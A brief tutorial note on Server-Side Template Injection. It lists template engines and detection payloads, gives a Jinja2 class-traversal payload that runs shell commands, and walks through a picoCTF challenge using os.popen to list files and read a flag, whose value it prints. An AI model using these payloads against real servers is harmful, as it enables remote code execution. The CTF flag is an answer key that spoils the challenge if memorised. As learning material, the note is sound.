SSTI
--------------------------------
SSTI stands for Server-Side Template Injection. It is a type of web security vulnerability where an attacker is able to inject malicious input into a server-side template engine, leading to unintended behavior such as:

1)Arbitrary code execution

2)Data leakage

3)Remote code execution (RCE)

----Template engines are used in web development to dynamically generate HTML pages on the server. Examples include:

--Jinja2 (Python)********

--Twig (PHP)

--Velocity (Java)

--ERB (Ruby)

--Smarty (PHP)

---🧪 How to Test for SSTI
Try payloads like:

{{7*7}}

${7*7} (Java EL)

<%= 7 * 7 %> (ERB)

If the result contains 49, it's vulnerable.

Example:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls',shell=True,stdout=-1).communicate() }}

This attempts to access Python’s internal classes to execute the ls command.



for more about jinja2 (python) templates

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/



Here is an example from SSTI picoctf:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
I run this 
No useful info 
Then I apply popen('ls') //to show what's there
it shows flag.txt file 
to read 
popen('cat flag')
the flag is
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}



